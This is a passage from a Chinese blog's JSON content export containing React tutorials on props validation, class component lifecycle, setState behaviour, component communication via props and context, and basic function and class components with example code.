(&#123;pageSize = 10&#125;) =&gt; &#123; return &lt;div&gt; pageSize的默认值：&#123;pageSize&#125;&lt;/div&gt;&#125;// 使用组件&lt;Pagination /&gt; props - 静态属性写法类的静态属性 实例属性需要实例化后，通过实例访问 静态属性，可以通过类直接访问 1234567891011class Person &#123; // 实例属性 gender = '男' // 静态属性 static age = 18&#125;// 访问静态属性console.log(Person.age) // 18// 访问实例属性const p = new Person()console.log(p.gender) // 男 类组件中 propTypes defaultProps 的使用 在类组件中通过 static propTypes = {} 定义props校验规则 static defaultProps = {} 定义props默认值 123456789101112131415class Demo extends Component &#123; // 校验 static propTypes = &#123; colors: PropTypes.array, gender: PropTypes.oneOf(['男', '女']).isRequired &#125; // 默认值 static defaultProps = &#123; gender: '男' &#125; render() &#123; return &lt;div&gt;Demo组件&lt;/div&gt; &#125;&#125; 生命周期 - 概览什么是组件生命周期 一个事物从创建到最后消亡经历的整个过程 React类组件的生命周期整体概览，组件从创建到消耗的过程React组件生命周期 生命周期的意义 助于理解组件的运行方式、完成更复杂的组件功能、分析组件错误原因 钩子函数为开发人员在不同阶段操作组件提供了时机 总结：只有类组件才有生命周期，分为 挂载阶段 更新阶段 卸载阶段 生命周期 - 挂载阶段执行顺序constructor() –&gt; render() –&gt; componentDidMount() 触发时机及作用 钩子函数 触发时机 作用 constructor 创建组件时，最先执行 1. 初始化state 2. 创建 Ref 3. 使用 bind 解决 this 指向问题等 render 每次组件渲染都会触发 渲染UI（注意： 不能调用setState() ） componentDidMount 组件挂载（完成DOM渲染）后 1. 发送网络请求 2.DOM操作 例： 123456789101112131415import &#123; Component &#125; from 'react' export default class App extends Component &#123; constructor () &#123; super() console.log('1. constructor执行') &#125; componentDidMount () &#123; console.log('3. componentDidMount执行') &#125; render() &#123; console.log('2. render执行') return &lt;div&gt;App组件&lt;/div&gt; &#125;&#125; 生命周期 - 更新阶段执行顺序render() –&gt; componentDidUpdate() 何时触发更新阶段 setState() forceUpdate() 强制组件更新 组件接收到新的props（实际上，只需要父组件更新，子组件就会重新渲染） 触发时机及作用 钩子函数 触发时机 作用 render 每次组件渲染都会触发 渲染UI（与 挂载阶段 是同一个render） componentDidUpdate 组件更新（完成DOM渲染）后 DOM操作，可以获取到更新后的DOM内容，不要直接调用setState 例： 123456789101112131415161718192021222324252627282930313233import &#123; Component &#125; from 'react'class Child extends Component &#123; render() &#123; return &lt;h1&gt;统计豆豆被打的次数：&lt;/h1&gt; &#125;&#125;export default class App extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125; componentDidUpdate() &#123; console.log('2. componentDidUpdate执行') &#125; render() &#123; console.log('1. render执行') return ( &lt;div&gt; &lt;Child /&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;打豆豆&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 生命周期 - 卸载阶段什么时候触发卸载？ 在组件被移除的时候（消失）触发卸载阶段 触发时机及作用 钩子函数 触发时机 作用 componentWillUnmount 组件卸载（从页面中消失） 执行清理工作（比如：清理定时器等） 例： 12345678910111213141516171819202122232425262728293031import &#123; Component &#125; from 'react'class Child extends Component &#123; componentWillUnmount () &#123; console.log('componentWillUnmount执行') &#125; render() &#123; return &lt;h1&gt;统计豆豆被打的次数：&#123;this.props.count&#125;&lt;/h1&gt; &#125;&#125;export default class App extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &#123; this.state.count &lt; 5 &amp;&amp; &lt;Child count=&#123;this.state.count&#125; /&gt;&#125; &lt;button onClick=&#123;this.handleClick&#125;&gt;打豆豆&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; setState扩展 - 发现问题 发现setState是“异步”的，多次setState会合并。 理解setState是“异步”的，理解setState会合并更新 调用 setState 时，将要更新的状态对象，放到一个更新队列中暂存起来（没有立即更新） 如果多次调用 setState 更新状态，状态会进行合并，后面覆盖前面 等到所有的操作都执行完毕，React 会拿到最终的状态，然后触发组件更新 1234567891011121314151617181920import React, &#123;Component&#125; from 'react' export default class Demo extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; this.setState(&#123;count: this.state.count+100&#125;) this.setState(&#123;count: this.state.count+1&#125;) console.log(this.state.count) // 打印0 &#125; render() &#123; console.log('render') return ( &lt;div&gt; &lt;div&gt;Demo组件：&#123;this.state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;体现“异步”和合并&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; React这么处理的好处是什么？ “异步” 更新，或者做延时更新，为了等所有操作结束后去更新 合并更新，是将多次setState合并，然后进行更新 都是为了提高渲染性能 setState扩展 - 更多用法 多次使用setState让数据串联使用的写法 123456789101112131415161718192021222324252627282930313233343536import React, &#123;Component&#125; from 'react' export default class Demo extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; // this.setState(&#123;count: this.state.count+1&#125;) // this.setState(&#123;count: this.state.count+1&#125;) // this.setState(&#123;count: this.state.count+1&#125;) // 页面展示 1 this.setState(prevState=&gt;&#123; return &#123; count: prevState.count + 1 &#125; &#125;) this.setState(prevState=&gt;&#123; return &#123; count: prevState.count + 1 &#125; &#125;) this.setState(prevState=&gt;&#123; return &#123; count: prevState.count + 1 &#125; &#125;) // 页面展示 3 &#125; render() &#123; return ( &lt;div&gt; &lt;div&gt;Demo组件：&#123;this.state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState串联更新数据&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 调用setState后页面更新后执行逻辑写法 123456789101112131415161718192021222324import React, &#123;Component&#125; from 'react' export default class Demo extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; this.setState(prevState=&gt;&#123; return &#123; count: prevState.count + 1 &#125; &#125;,()=&gt;&#123; console.log('更新后：', this.state.count) // 打印：1 &#125;) console.log('未更新：', this.state.count) // 打印：0 &#125; render() &#123; return ( &lt;div&gt; &lt;div&gt;Demo组件：&#123;this.state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState更新后执行逻辑&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 总结 使用 setState((prevState) =&gt; {}) 语法，可以解决多次调用状态依赖问题 使用 setState(updater[, callback]) 语法，在状态更新（页面完成重新渲染）后立即执行某个操作 setState扩展 - 异步OR同步在react类组件中，多次的setState并不会立刻执行，而是合并成一个来执行。 setState本身并不是一个异步方法，其之所以会表现出一种“异步”的形式，是因为react框架本身的一个性能优化机制 React会将多个setState的调用合并为一个来执行，也就是说，当执行setState的时候，state中的数据并不会马上更新 知道何时出现“异步”，知道何时出现同步 setState如果是在react的生命周期中或者是事件处理函数中，表现出来为：延迟合并更新（“异步更新”） setState如果是在setTimeout/setInterval或者原生事件中，表现出来是：立即更新（“同步更新”） 123456789101112131415161718192021222324252627import React, &#123;Component&#125; from 'react' export default class Demo extends Component &#123; state = &#123; count: 0 &#125; handleClick = () =&gt; &#123; // 合成事件的处理函数 or 生命周期构造函数 // this.setState(&#123;count: this.state.count+1&#125;) // this.setState(&#123;count: this.state.count+1&#125;) // 表现异步 setTimeout(() =&gt; &#123; this.setState(&#123;count: this.state.count+1&#125;) this.setState(&#123;count: this.state.count+1&#125;) &#125;, 0); // 表现同步 &#125; render() &#123; console.log('render') return ( &lt;div&gt; &lt;div&gt;Demo组件：&#123;this.state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;同步OR异步&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"React组件","slug":"React组件","permalink":"//www.shen.ee/tags/React组件/"},{"name":"React组件高级","slug":"React组件高级","permalink":"//www.shen.ee/tags/React组件高级/"},{"name":"React组件进阶","slug":"React组件进阶","permalink":"//www.shen.ee/tags/React组件进阶/"},{"name":"props校验","slug":"props校验","permalink":"//www.shen.ee/tags/props校验/"},{"name":"React生命周期","slug":"React生命周期","permalink":"//www.shen.ee/tags/React生命周期/"},{"name":"props默认值","slug":"props默认值","permalink":"//www.shen.ee/tags/props默认值/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React快速上手","slug":"React快速上手","date":"2022-06-15T02:38:39.000Z","updated":"2022-06-22T06:24:25.998Z","comments":true,"path":"article/44037.html","link":"","permalink":"//www.shen.ee/article/44037.html","excerpt":"","text":"React介绍 了解 react 的历史背景和基本概念 React 起源于 Facebook 的内部项目。因为该公司对市场上所有 JavaScript MVC 框架，都不满意，就决定自己写一套，用来架设 Instagram 的网站。做出来以后，发现这套东西很好用，就在 2013 年 5 月开源了。 React 是最流行的前端框架之一。对比近两年 Vue 和 Angular 的下载量，还有 2021 年开发者使用的 web 框架的 比例 ，可以看到 React 是前端工程师应该必备技能之一，现在很多大厂也在使用它。 React 是一个用于构建用户界面的 JavaScript 库。可以理解它只负责 MVC 中的视图层渲染，不直接提供数据模型和控制器功能。react-router 实现路由，redux 实现状态管理，可以使用它们来构建一个完整应用。 React 中文站：React 官方中文文档 – 用于构建用户界面的 JavaScript 库 总结： React 是 Facebook 开源的，现在它是最流行的前端框架大厂必备，React 本身是一个构建 UI 的库，如果需要开发一个完整的 web 应用需要配合 react-router，redux，…等。 React特点 了解 react 的三个核心特点 (1)声明式React 使创建交互式 UI 变得轻而易举。为你应用的每一个状态设计简洁的视图，当数据变动时 React 能高效更新并渲染合适的组件。 以声明式编写 UI，可以让你的代码更加可靠，且方便调试。 (2)组件化创建拥有各自状态的组件，再由这些组件构成更加复杂的 UI。 组件逻辑使用 JavaScript 编写而非模版，因此你可以轻松地在应用中传递数据，并使得状态与 DOM 分离。 (3)一次学习，跨平台编写无论你现在使用什么技术栈，在无需重写现有代码的前提下，通过引入 React 来开发新功能。React 还可以使用 Node 进行服务器渲染，或使用 React Native 开发原生移动应用。 总结： 声明式 UI 更清晰快捷，组件化开发更灵活，可支持 SSR,SPA ,NativeApp,VR 多平台。 React 脚手架 掌握使用 create-react-app 脚手架创建项目 创建项目方式： 全局安装脚手架再使用命令创建项目 使用 npx 远程调用脚手架创建项目 方式一 全局安装 12# 全局安装脚手架npm i create-react-app -g 创建项目 12# project-name 项目名称create-react-app project-name 方式二 npx 安装，npm5.2+支持 12# project-name 项目名称npx create-react-app project-name 推荐： 使用方式二这样每次使用的最新脚手架创建项目，创建完毕使用 npm start 启动项目。 React 基本使用 在 create-react-app 脚手架创建项目中，掌握使用 react 基本步骤 使用步骤： 导入 react、react-dom 两个包 使用 react 创建 react 元素（虚拟 DOM） 使用 react-dom 渲染 react 元素 落地代码：src 内文件删除，创建src/index.js 导包 12345// 负责创建react元素import React from 'react';// 负责把react元素渲染到页面import ReactDom from 'react-dom'; 创建 react 元素 1234// 参数1：标签名称// 参数2：属性集合 特殊 class==&gt;className for==&gt;htmlFor// 参数3：标签内容const element = React.createElement('h1', &#123; id: 'el' &#125;, 'Hello React'); 渲染 react 元素 12// #root在public/index.html上ReactDom.render(element, document.getElementById('root')); 总结： 使用 react 创建元素，使用 react-dom 渲染元素。 React 创建元素练习 掌握使用 react 创建嵌套元素 使用 react 创建如下元素 1234567&lt;div class=\"list\"&gt; &lt;h1&gt;水果&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;橘子&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; React代码 123456789101112import React from 'react';import ReactDOM from 'react-dom'; const element = React.createElement('div', &#123; className: 'list' &#125;, [ React.createElement('h1', null, '水果'), React.createElement('ul', null, [ React.createElement('li', null, '苹果'), React.createElement('li', null, '橘子'), ]),]); ReactDOM.render(element, document.getElementById('root')); 总结： 使用 createElement 创建元素非常麻烦、可读性差、不优雅，开发中推荐使用 JSX 来声明 UI。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"React快速上手","slug":"React快速上手","permalink":"//www.shen.ee/tags/React快速上手/"},{"name":"React入门","slug":"React入门","permalink":"//www.shen.ee/tags/React入门/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React组件通讯","slug":"React组件通讯","date":"2022-06-15T02:38:39.000Z","updated":"2022-06-22T06:24:26.000Z","comments":true,"path":"article/50340.html","link":"","permalink":"//www.shen.ee/article/50340.html","excerpt":"","text":"组件通讯-概念 组件状态是独立的，组件化之后涉及状态同步，需要进行组件通讯 组件的特点 组件是独立且封闭的单元，默认情况下，只能使用组件自己的数据 在组件化过程中，通常会将一个完整的功能拆分成多个组件，以更好的完成整个应用的功能 组件通讯意义 而在这个过程中，多个组件之间不可避免的要共享某些数据 为了实现这些功能，就需要打破组件的独立封闭性，让其与外界沟通 这个过程就是组件通讯 props 基本使用传递数据和接收数据的过程 使用组件的时候通过属性绑定数据，在组件内部通过 props 获取即可。 函数组件使用 props12// 使用组件&lt;Hello name=\"jack\" age=\"20\" /&gt; 1234// 定义组件 props包含&#123;name:'jack',age:'20'&#125;function Hello(props) &#123; return &lt;div&gt;接收到数据:&#123;props.name&#125;&lt;/div&gt;;&#125; 类组件使用 props12// 使用组件&lt;Hello name=\"jack\" age=\"20\" /&gt; 123456// 定义组件 props包含&#123;name:'jack',age:'20'&#125;class Hello extends Component &#123; render() &#123; return &lt;div&gt;接收到的数据:&#123;this.props.age&#125;&lt;/div&gt;; &#125;&#125; props 注意事项什么是单向数据流 单向数据流，是从上到下的，自顶而下的，数据流。 好比：河流，瀑布，只能从上往下流动，上游污染下游受影响，但是下游不能影响上游。 父组件传递数据给子组件，父组件更新数据子组件自动接收更新后数据，但是子组件是不能修改数据的。 props 可以传递什么数据？ 字符串 数字 布尔 数组 对象 函数 JSX （插槽） …任意 父传子方式大致步骤： 父组件提供要传递的 state 数据 给子组件标签添加属性，值为 state 中的数据 子组件中通过 props 接收父组件中传递的数据 父组件提供要传递的 state 数据123456789101112class Parent extends React.Component &#123; state = &#123; money: 10000, &#125;; render() &#123; return ( &lt;div&gt; &lt;h1&gt;父组件：&#123;this.state.money&#125;&lt;/h1&gt; &lt;/div&gt; ); &#125;&#125; 给子组件标签添加属性，值为 state 中的数据12345678910111213class Parent extends React.Component &#123; state = &#123; money: 10000 &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;父组件：&#123;this.state.money&#125;&lt;/h1&gt;+ &lt;Child money=&#123;this.state.money&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 子组件中通过 props 接收父组件中传递的数据1234567function Child(props) &#123; return ( &lt;div&gt; &lt;h3&gt;子组件：&#123;props.money&#125;&lt;/h3&gt; &lt;/div&gt; );&#125; 子传父方式 父组件提供回调函数，通过 props 传递给子组件 子组件调用 props 中的回调函数，函数可传参 父组件函数的参数就是子组件传递的数据 父组件1234567891011121314151617181920class Parent extends React.Component &#123; state = &#123; money: 10000, &#125;; // 回调函数 buyPhone = (price) =&gt; &#123; this.setState(&#123; money: this.state.money - price, &#125;); &#125;; render() &#123; const &#123; money &#125; = this.state; return ( &lt;div&gt; &lt;h1&gt;父组件：&#123;money&#125;&lt;/h1&gt; &lt;Child money=&#123;money&#125; buyPhone=&#123;this.buyPhone&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 子组件123456789101112const Child = (props) =&gt; &#123; const handleClick = () =&gt; &#123; // 子组件调用父组件传递过来的回调函数 props.buyPhone(5000); &#125;; return ( &lt;div&gt; &lt;h3&gt;子组件：&#123;props.money&#125;&lt;/h3&gt; &lt;button onClick=&#123;handleClick&#125;&gt;买手机&lt;/button&gt; &lt;/div&gt; );&#125;; 兄弟组件通讯 通过状态提升思想完成兄弟组件数据通讯 状态提升思想是什么？ 将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态和修改状态的方法 需要通讯的组件通过 props 接收状态和函数即可 参考代码： index.js 123456789101112131415161718192021222324252627282930313233import React, &#123; Component &#125; from 'react';import ReactDOM from 'react-dom'; // 导入两个子组件import Jack from './Jack';import Rose from './Rose'; // App 是父组件class App extends Component &#123; // 1. 状态提升到父组件 state = &#123; msg: '', &#125;; changeMsg = (msg) =&gt; &#123; this.setState(&#123; msg &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;h1&gt;我是App组件&lt;/h1&gt; &#123;/* 兄弟组件 1 */&#125; &lt;Jack changeMsg=&#123;this.changeMsg&#125;&gt;&lt;/Jack&gt; &#123;/* 兄弟组件 2 */&#125; &lt;Rose msg=&#123;this.state.msg&#125;&gt;&lt;/Rose&gt; &lt;/div&gt; ); &#125;&#125; // 渲染组件ReactDOM.render(&lt;App /&gt;, document.getElementById('root')); Jack.js 12345678910111213141516import React, &#123; Component &#125; from 'react';export default class Jack extends Component &#123; say = () =&gt; &#123; // 修改数据 this.props.changeMsg('you jump i look'); &#125;; render() &#123; return ( &lt;div&gt; &lt;h3&gt;我是Jack组件&lt;/h3&gt; &lt;button onClick=&#123;this.say&#125;&gt;说&lt;/button&gt; &lt;/div&gt; ); &#125;&#125; Rose.jsx 1234567891011import React, &#123; Component &#125; from 'react';export default class Rose extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;h3&gt;我是Rose组件-&#123;this.props.msg&#125;&lt;/h3&gt; &lt;/div&gt; ); &#125;&#125; context 跨级组件通讯什么是跨级组件通讯？ 组件间相隔多层，理解成叔侄，甚至更远的亲戚。 context 怎么去理解？ 术语：上下文 理解：一个范围，只要在这个范围内，就可以跨级组件通讯。（不需要 props 层层传递） context 使用方法 创建上下文 context.js 12import &#123; createContext &#125; from 'react' // 引入创建上下文的方法export default createContext(初始值) // 初始值会在找不到Provider提供者时生效 使用上下文的Provider组件作为提供者 1234567891011import Context from './context'import Child from './Child';function Parent () &#123; return ( // Provider包裹确定上下文生效范围，value注入范围内可用的数据 &lt;Context.Provider value=&#123;context共享的值&#125;&gt; ....子孙组件 &lt;/Context.Provider&gt; )&#125; 使上下文的Consumer作为消费者 12345678910import Context from './context'function Child () &#123; return ( &lt;Context.Consumer&gt; &#123; value =&gt; JSX &#125; &lt;/Context.Consumer&gt; )&#125; 示例 index.jsx 1234567891011121314151617181920212223242526272829303132import React, &#123; Component, createContext &#125; from 'react'import Parent from './Parent' // 1. 创建上下文对象// @ts-ignoreexport const MyContext = createContext() export default class App extends Component &#123; state = &#123; money: 10000 &#125; updateMoney = newMoney =&gt; &#123; this.setState(&#123; money: newMoney &#125;) &#125; render() &#123; return ( // 2. Provider包裹确定上下文生效范围，value注入范围内可用的数据 &lt;MyContext.Provider value=&#123;&#123; money: this.state.money, updateMoney: this.updateMoney &#125;&#125;&gt; &lt;div className=\"app\"&gt; &lt;h1&gt;根组件：&#123;this.state.money&#125;&lt;/h1&gt; &lt;hr /&gt; &lt;Parent /&gt; &lt;/div&gt; &lt;/MyContext.Provider&gt; ) &#125;&#125; Parent.jsx 123456789101112import Child from './Child';const Parent = () =&gt; &#123; return ( &lt;div className=\"parent\"&gt; &lt;h3&gt;父组件：&lt;/h3&gt; &lt;hr /&gt; &lt;Child /&gt; &lt;/div&gt; );&#125;; export default Parent; Child.jsx 12345678910111213141516import &#123; MyContext &#125; from './App' const Child = () =&gt; &#123; return ( // 3. 通过Consumer来消费数据，value=&gt;&#123; 这里使用数据 &#125; &lt;MyContext.Consumer&gt; &#123;(value) =&gt; ( &lt;div className=\"child\"&gt; &lt;h5&gt;子组件：&#123;value.money&#125; &lt;button onClick=&#123;()=&gt;value.updateMoney(5000)&#125;&gt;修改money&lt;/button&gt;&lt;/h5&gt; &lt;/div&gt; )&#125; &lt;/MyContext.Consumer&gt; );&#125;; export default Child; 总结： 使用creatContext()创建一个上下文对象，包含：Provider Consumer 组件。 使用 Provider 包裹组件，value 属性注入状态，函数，被包裹组件下的任何组件可以使用。 使用 Consumer 消费 Provider 提供的数据和函数，语法{value=&gt;使用数据和函数}","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"React组件","slug":"React组件","permalink":"//www.shen.ee/tags/React组件/"},{"name":"React组件通讯","slug":"React组件通讯","permalink":"//www.shen.ee/tags/React组件通讯/"},{"name":"React父子组件传值","slug":"React父子组件传值","permalink":"//www.shen.ee/tags/React父子组件传值/"},{"name":"React兄弟组件传值","slug":"React兄弟组件传值","permalink":"//www.shen.ee/tags/React兄弟组件传值/"},{"name":"组件传值","slug":"组件传值","permalink":"//www.shen.ee/tags/组件传值/"},{"name":"父子组件传值","slug":"父子组件传值","permalink":"//www.shen.ee/tags/父子组件传值/"},{"name":"props","slug":"props","permalink":"//www.shen.ee/tags/props/"},{"name":"context跨级组件通讯","slug":"context跨级组件通讯","permalink":"//www.shen.ee/tags/context跨级组件通讯/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React组件基础","slug":"React组件基础","date":"2022-06-15T02:38:39.000Z","updated":"2022-06-22T06:24:26.003Z","comments":true,"path":"article/9550.html","link":"","permalink":"//www.shen.ee/article/9550.html","excerpt":"","text":"React 组件介绍组件允许你将 UI 拆分为独立可复用的代码片段，并对每个片段进行独立构思。 组件表示页面中的部分功能，组合多个组件实现完整的页面。 功能特点：可复用、独立、可组合。 React组件的两种创建方式React 创建组件方法： 使用函数 function 使用类 class 函数组件1）什么是函数组件？ 使用 JS 函数（普通，箭头）创建的组件。 2）定义函数组件 语法约定 函数名称首字母必需大写，React 据此来区分组件和 HTML 元素。 函数必须有返回值，表示该组件的 UI 结构，如果不渲染任何内容可返回null。 123456789101112131415// 普通函数function Header() &#123; return &lt;div&gt;头部组件&lt;/div&gt;;&#125;// 箭头函数const Footer = () =&gt; &#123; return &lt;div&gt;底部组件&lt;/div&gt;;&#125;;// 不渲染内容const Loading = () =&gt; &#123; const loading = false; return loading ? &lt;div&gt;正在加载...&lt;/div&gt; : null;&#125;; 3）使用组件 函数的名称就是组件名称，使用组件就是把组件名称当标签使用即可。 组件标签可以是单标签也可以是双标签。 123456789101112131415161718192021222324252627282930import ReactDom from 'react-dom';// 普通函数function Header() &#123; return &lt;div&gt;头部组件&lt;/div&gt;;&#125;// 箭头函数const Footer = () =&gt; &#123; return &lt;div&gt;底部组件&lt;/div&gt;;&#125;;// 加载组件，不渲染内容const Loading = () =&gt; &#123; const loading = false; return loading ? &lt;div&gt;正在加载...&lt;/div&gt; : null;&#125;;// 根组件const App = () =&gt; &#123; return ( &lt;&gt; &lt;Header /&gt; &lt;Loading /&gt; &lt;Footer /&gt; &lt;/&gt; );&#125;;ReactDom.render(&lt;App /&gt;, document.getElementById('root')); 总结 创建函数组件，首字母大写，需要返回值，不渲染就返回 null。 使用函数组件，组件名称当作标签使用即可。 类组件class 语法复习一下定义class、定义属性、定义函数。 1234567// 动物class Animal &#123; address = '地球'; eat() &#123; console.log('吃'); &#125;&#125; extends 继承父类 1234567891011// 猫class Cat extends Animal &#123; run() &#123; console.log('跑'); &#125;&#125; const cat = new Cat();cat.run(); // 跑cat.eat(); // 吃console.log(cat.address); // 地球 总结： class创建类，extends继承类，可以使用父类的属性和函数。 1）什么是类组件？ 使用class语法创建的组件就是类组件 2）定义类组件 约定：类名首字母必需大写 约定：必须继承React.Component父类 约定：必需有render函数，返回 UI 结构，无渲染可返回 null 1234567import &#123; Component &#125; from 'react'; class Header extends Component &#123; render() &#123; return &lt;div&gt;头部组件&lt;/div&gt;; &#125;&#125; 3）使用类组件 类名称就是组件名称，使用组件就是把组件名称当标签使用即可。 12345678910111213141516171819202122import &#123; Component &#125; from 'react';import ReactDom from 'react-dom'; // 头部class Header extends Component &#123; render() &#123; return &lt;div&gt;头部组件&lt;/div&gt;; &#125;&#125; // 根组件class App extends Component &#123; render() &#123; return ( &lt;&gt; &lt;Header /&gt; &lt;/&gt; ); &#125;&#125; ReactDom.render(&lt;App /&gt;, document.getElementById('root')); 总结 使用class定义类，使用extends继承React.Component完成类组件定义 类名首字母大写，必须有render函数返回 UI 结构，无渲染可返回null 使用的时候把类名当作标签使用即可 组件抽离如果所有组件写在一个文件，代码写在一起后续会难以维护，组件作为一个独立的个体，一般都会放到一个单独的JS文件中。 抽离组件 定义一个js或者jsx文件定义组件默认导出 使用组件导入即可，当作标签使用。 具体操作： 1.新建 src/components/Header.jsx 类组件，新建 src/components/Footer.jsx 函数组件 1234567import &#123; Component &#125; from 'react';class Header extends Component &#123; render() &#123; return &lt;div&gt;头部组件&lt;/div&gt;; &#125;&#125;export default Header; 1234const Footer = () =&gt; &#123; return &lt;div&gt;底部组件&lt;/div&gt;;&#125;;export default Footer; 2.新建 src/App.jsx 组件, 导入Header Footer组件使用。 1234567891011121314import &#123; Component &#125; from 'react';import Header from './components/Header.jsx';import Footer from './components/Footer.jsx';class App extends Component &#123; render() &#123; return ( &lt;&gt; &lt;Header /&gt; 内容 &lt;Footer /&gt; &lt;/&gt; ); &#125;&#125; 3.index.js 使用 App 根组件 123import ReactDom from 'react-dom';import App from './App.jsx';ReactDom.render(&lt;App /&gt;, document.getElementById('root')); 无状态组件和有状态组件 简单理解： 无状态(函数)组件，负责静态结构展示 有状态(类）组件，负责更新UI，让页面动起来 1.无状态组件 组件本身不定义状态，没有组件生命周期，只负责 UI 渲染。 React16.8之前的函数组件都是无状态组件，Hooks 出现后函数组件也可以有状态。 2.有状态组件 组件本身有独立数据，拥有组件生命周期，存在交互行为。 class 组件可以定义组件自己的状态，拥有组件生命周期，它是有状态组件。 3.它们的区别 无状态组件由于没有维护状态只做渲染，性能较好。有状态组件提供数据和生命周期，能力更强。 4.如何去选择 React16.8之前，组件不需要维护数据只渲染就使用函数组件，有数据和交互使用类组件。你需要去判断，有心智负担。 React16.8之后，Hooks出现给函数提供状态，建议使用函数组件即可。 总结 组件本身没有状态就是无状态组件，组件本身提供状态就是有状态组件。 16.8 之前，无状态组件使用函数组件，有状态组件使用类组件。16.8 之后，统一可使用函数组件。 React 没有说完全取代类组件，老项目中还是类组件居多，我们有必要学习下它的具体用法。 类组件 - 定义状态 定义state属性定义组件状态，属于组件自己的数据，它的值是个对象。 使用state的时候通过this去访问即可，例如：this.state.xxx。 数据发生变化，驱动视图更新。 12345678910111213141516171819202122import &#123; Component &#125; from 'react'; class App extends Component &#123; // 状态 state = &#123; title: '数码产品', list: ['电脑', '手机', '相机'], &#125;; render() &#123; return ( &lt;&gt; &lt;h3&gt;&#123;this.state.title&#125;&lt;/h3&gt; &lt;ul&gt; &#123;this.state.list.map((item) =&gt; &#123; return &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;/li&gt;; &#125;)&#125; &lt;/ul&gt; &lt;/&gt; ); &#125;&#125;export default App; 总结： 定义state属性，值是对象存储数据，this.state.xxx使用数据，数据驱动视图更新。 类组件 - 绑定事件 在类中声明事件处理函数，在标签上使用on+事件名称={处理函数}的方式绑定事件，事件名称需要遵循大驼峰规则。 处理函数默认的参数就是事件对象，可以使用事件对象处理默认行为和事件冒泡。 12345678910111213141516171819202122232425262728293031323334import &#123; Component &#125; from 'react'; class App extends Component &#123; // 状态 state = &#123; count: 0, &#125;; // 事件处理函数 handleClick(e) &#123; // 默认行为 e.preventDefault(); // 事件冒泡 e.stopPropagation(); console.log('handleClick'); &#125; handleMouseEnter() &#123; console.log('handleMouseEnter'); &#125; render() &#123; return ( &lt;&gt; &lt;div onMouseEnter=&#123;this.handleMouseEnter&#125;&gt; 计数器：&#123;this.state.count&#125; &lt;/div&gt; &lt;div&gt; &lt;a href=\"http://www.iyouhun.com\" onClick=&#123;this.handleClick&#125;&gt; 按钮 &lt;/a&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 总结： 绑定事件的方式和原生的方式一致，使用 on+事件名称={处理函数} 方式绑定 事件名称使用大驼峰规则，例如：onClick onMouseEnter , 处理函数默认传参为事件对象。 事件绑定this指向 在事件处理函数中打印 this.state.count 发现报错，this 是个undefined。 演示函数调用对 this 指向的影响，得出函数谁调用 this 就执行谁。 找出原因：处理函数不是通过组件去调用的，导致出现 this 不是组件问题。 1.发现this是undefined12345678910111213141516171819202122232425import &#123; Component &#125; from 'react'; class App extends Component &#123; // 状态 state = &#123; count: 0, &#125;; // 事件处理函数 handleClick(e) &#123; console.log(e); // Uncaught TypeError: Cannot read properties of undefined (reading 'state') console.log(this.state.count); &#125; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 2.演示处理函数调用对 this 的影响123456789const obj = &#123; name: 'tom', say() &#123; console.log(this); &#125;,&#125;;obj.say(); // 打印：&#123;name: 'tom', say: function&#125;const say = obj.say;say(); // 打印：window对象 严格模式 3.问题原因 类组件声明的处理函数，赋值给 on+事件名称 属性，调用的时候不是通过组件调用的。 处理 this 指向问题 通过绑定箭头函数解决 this 问题 通过 bind 解决 this 问题 通过声明箭头函数解决 this 问题 1.通过绑定箭头函数解决 this 问题123456789101112131415161718192021222324import &#123; Component &#125; from \"react\"; class App extends Component &#123; // 状态 state = &#123; count: 0, &#125;; // 事件处理函数 handleClick(e) &#123; console.log(e) console.log(this.state.count) &#125; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt;+ 